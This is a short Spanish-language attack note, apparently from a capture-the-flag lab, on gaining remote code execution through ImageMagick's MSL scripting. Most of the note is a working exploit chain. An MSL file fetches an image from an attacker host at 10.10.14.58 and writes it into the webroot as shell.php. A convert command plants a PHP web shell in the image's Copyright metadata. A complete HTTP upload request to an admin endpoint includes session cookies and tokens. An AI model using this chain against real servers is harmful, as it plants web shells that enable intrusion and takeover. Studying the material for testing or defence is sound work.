# Image magick RCE attack
- [Articulo](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)
- Si encontramos algún aplicativo utilizando ImageMagick, podemos intentar ejecutar código remoto a través de la carga de una imagen maliciosa o de un magick scripting language (MSL).
    - los MSL son archivos XML que contienen instrucciones para ImageMagick.
    - La carga de un MSL malicioso puede permitir la ejecución de código arbitrario en el servidor.

## Ejemplo de payload

```xml
<?xml version="1.0" encoding="UTF-8"?>
<image>
 <read filename="http://10.10.14.58/positive.png" />
  <write filename="/var/www/html/intentions/public/shell.php" />
</image>
```

- Siendo positive: `convert xc:red -set 'Copyright' '<?php echo shell_exec($_REQUEST["cmd"]); ?>' positive.png`
    - `convert` es el comando de ImageMagick para convertir imágenes.
    - `xc:red` es un color sólido rojo.
    - Entonces lo que hace esto es crear una imagen roja y establecer el campo de metadatos 'Copyright' con el contenido del script PHP.

## Ejemplo de petición HTTP para subir este payload

```
POST /api/v2/admin/image/modify?path=vid:msl:/tmp/php*&effect=charcoal HTTP/1.1
Host: 10.10.11.220
Content-Length: 294
X-XSRF-TOKEN: eyJpdiI6IlA2Qnpka1pWQm1nTG5RK3lFc05jekE9PSIsInZhbHVlIjoiOEljTnJWb0pLczFYZmtJcU5nWkdSVjE5SVhrYnU1VWZuSW4vZnRjZWVrNzNJWnNpTjYzUCt4N2dyM1BOaDRHQnJncDdqUmxoeHRxV3pCYnVoa2w4VWhEcGhSSWVGV3ZpVWljMElKY1EzczI3NEYzU0FSZXNmZVNWKy9iTUlxeFciLCJtYWMiOiJhNzkzMjgzZTRkNzAxMTliMjk2ZmI3YTgxMzk5YzQ5OTIxY2IwYmEzNDI4OGNkMGRmM2I5NWE3OGZmMTYwYWUzIiwidGFnIjoiIn0=
X-Requested-With: XMLHttpRequest
Accept-Language: en-US,en;q=0.9
Accept: application/json, text/plain, */*
Content-Type: multipart/form-data; boundary=ABC
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36
Origin: http://10.10.11.220
Referer: http://10.10.11.220/admin
Accept-Encoding: gzip, deflate, br
Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vMTAuMTAuMTEuMjIwL2FwaS92Mi9hdXRoL2xvZ2luIiwiaWF0IjoxNzQ0MDQ5MzMzLCJleHAiOjE3NDQwNzA5MzMsIm5iZiI6MTc0NDA0OTMzMywianRpIjoiSlRrV0NnTm5RSFJOZ29QQiIsInN1YiI6IjEiLCJwcnYiOiIyM2JkNWM4OTQ5ZjYwMGFkYjM5ZTcwMWM0MDA4NzJkYjdhNTk3NmY3In0.o1yh_a8A1SiugE90Ia6xVhk3Ap8RQSC0AZPW9lCaFPo; XSRF-TOKEN=eyJpdiI6IlA2Qnpka1pWQm1nTG5RK3lFc05jekE9PSIsInZhbHVlIjoiOEljTnJWb0pLczFYZmtJcU5nWkdSVjE5SVhrYnU1VWZuSW4vZnRjZWVrNzNJWnNpTjYzUCt4N2dyM1BOaDRHQnJncDdqUmxoeHRxV3pCYnVoa2w4VWhEcGhSSWVGV3ZpVWljMElKY1EzczI3NEYzU0FSZXNmZVNWKy9iTUlxeFciLCJtYWMiOiJhNzkzMjgzZTRkNzAxMTliMjk2ZmI3YTgxMzk5YzQ5OTIxY2IwYmEzNDI4OGNkMGRmM2I5NWE3OGZmMTYwYWUzIiwidGFnIjoiIn0%3D; intentions_session=eyJpdiI6ImsvS1lzSUNTaVdqdDhNZ3FkUUYvZ2c9PSIsInZhbHVlIjoiNzdqdk82MHlOdEYrQWxnM2UrWGtXQWZob3VZdk5pVjdKOHFGRFMxYUlPWUdkaUZpNjdXVVNjUEc3S01ZQisxRHk5MzBoelpTWldlZ3hMYkkwVlZSalh1SHM4aGJHRGFwWVFoMXVDcTY0a21JbDFCemFGTnM3c3RITWRiNHZJODEiLCJtYWMiOiI0YTU4NmY1ZWI1NDVjMjM0MTljOTk0MzA5MjgwNzY3Y2I0ZDY3M2UwZWVlMTNlNmYxYTg5Y2I4OGM5YTM3NDc4IiwidGFnIjoiIn0%3D
Connection: keep-alive
--ABC
Content-Disposition: form-data; name="swarm"; filename="swarm.msl"
Content-Type: text/plain
<?xml version="1.0" encoding="UTF-8"?>
<image>
 <read filename="http://10.10.14.58/positive.png" />
  <write filename="/var/www/html/intentions/public/shell.php" />
</image>
--ABC--
``` 

----

- Esta vulnerabilidad es clasificada como RCE.
